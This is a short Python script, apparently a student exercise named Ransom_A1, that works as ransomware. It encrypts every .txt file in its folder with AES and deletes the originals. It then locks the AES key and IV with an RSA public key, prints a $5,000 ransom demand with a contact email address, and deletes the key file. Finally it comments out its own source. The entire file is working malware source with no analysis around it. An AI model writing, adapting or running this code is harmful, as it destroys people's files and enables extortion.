from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes 
import os
from Crypto.PublicKey import RSA 
from Crypto.Random import get_random_bytes 
from Crypto.Cipher import PKCS1_OAEP 

try:
    recipient_key = RSA.import_key(open("receiver.pem").read()) 
except:
    print("reciver.pem was not found , please try again with receiver.pem in the same folder as Ransom_A1.pye")
#generates 256 bytes key and does the encryption of every file in the location and changes its file type from ".txt" to ".enc"
key = get_random_bytes(32) 
cipher = AES.new(key, AES.MODE_CBC)
iv = b64encode(cipher.iv).decode('utf-8')   
key = b64encode(key).decode('utf-8')    
f = open("key.bin", "w")
f.write(iv+'\n'+key)
path = os.path.dirname(os.path.realpath(__file__))
files = os.listdir(path)
files_txt = [i for i in files if i.endswith('.txt')]
      
for file in files_txt:
        f = open(file, "rb")
        data = f.read()
        ct_bytes = cipher.encrypt(pad(data, AES.block_size)) 
        ct = b64encode(ct_bytes).decode('utf-8') 
        f.close()
        os.remove(file)
        f = open(file[:-4]+".enc", "w")
        f.write(ct)
        f.close()

#stores the key and iv in a file called key.bin and encrypts it with a RSA encryption using the public key of the user
recipient_key = RSA.import_key(open("receiver.pem").read()) 
f = open("key.bin", "rb")
data = f.read()
f.close()
file_out = open("key.bin", "wb") 
cipher_rsa = PKCS1_OAEP.new(recipient_key) 
enc_data = cipher_rsa.encrypt(data) 
file_out.write(enc_data) 
file_out.close() 

#comments out this python file
print('Your text files are encrypted. To decrypt them, you need to pay me $5,000 and send key.bin in your folder to jahirhm001@mymail.sim.edu.sg')
os.remove("receiver.pem")
sourcecode=""
f = open("Ransom_A1.pye", "r")
sourcecode = f.read()
f.close
f = open("Ransom_A1.pye", "w")
f.write("\"\"\""+"\n")
f.write(sourcecode)
f.write("\"\"\""+"\n")
f.close()


